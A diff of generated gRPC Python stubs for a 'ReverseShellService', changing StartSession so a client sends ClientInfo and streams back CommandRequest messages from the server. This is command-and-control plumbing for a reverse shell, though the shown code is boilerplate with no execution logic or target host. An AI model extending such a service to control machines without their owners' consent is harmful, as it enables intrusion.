@@ -40,10 +40,10 @@ class ReverseShellServiceStub(object):
         Args:
             channel: A grpc.Channel.
         """
-        self.StartSession = channel.stream_stream(
+        self.StartSession = channel.unary_stream(
                 '/reverse_shell.ReverseShellService/StartSession',
-                request_serializer=reverse__shell__pb2.CommandRequest.SerializeToString,
-                response_deserializer=reverse__shell__pb2.CommandResponse.FromString,
+                request_serializer=reverse__shell__pb2.ClientInfo.SerializeToString,
+                response_deserializer=reverse__shell__pb2.CommandRequest.FromString,
                 _registered_method=True)
         self.StreamResponses = channel.stream_stream(
                 '/reverse_shell.ReverseShellService/StreamResponses',
@@ -66,7 +66,7 @@ class ReverseShellServiceServicer(object):
     """The ReverseShellService definition.
     """
 
-    def StartSession(self, request_iterator, context):
+    def StartSession(self, request, context):
         """Missing associated documentation comment in .proto file."""
         context.set_code(grpc.StatusCode.UNIMPLEMENTED)
         context.set_details('Method not implemented!')
@@ -93,10 +93,10 @@ class ReverseShellServiceServicer(object):
 
 def add_ReverseShellServiceServicer_to_server(servicer, server):
     rpc_method_handlers = {
-            'StartSession': grpc.stream_stream_rpc_method_handler(
+            'StartSession': grpc.unary_stream_rpc_method_handler(
                     servicer.StartSession,
-                    request_deserializer=reverse__shell__pb2.CommandRequest.FromString,
-                    response_serializer=reverse__shell__pb2.CommandResponse.SerializeToString,
+                    request_deserializer=reverse__shell__pb2.ClientInfo.FromString,
+                    response_serializer=reverse__shell__pb2.CommandRequest.SerializeToString,
             ),
             'StreamResponses': grpc.stream_stream_rpc_method_handler(
                     servicer.StreamResponses,
@@ -126,7 +126,7 @@ class ReverseShellService(object):
     """
 
     @staticmethod
-    def StartSession(request_iterator,
+    def StartSession(request,
             target,
             options=(),
             channel_credentials=None,
@@ -136,12 +136,12 @@ class ReverseShellService(object):
             wait_for_ready=None,
             timeout=None,
             metadata=None):
-        return grpc.experimental.stream_stream(
-            request_iterator,
+        return grpc.experimental.unary_stream(
+            request,
             target,
             '/reverse_shell.ReverseShellService/StartSession',
-            reverse__shell__pb2.CommandRequest.SerializeToString,
-            reverse__shell__pb2.CommandResponse.FromString,
+            reverse__shell__pb2.ClientInfo.SerializeToString,
+            reverse__shell__pb2.CommandRequest.FromString,
             options,
             channel_credentials,
             insecure,
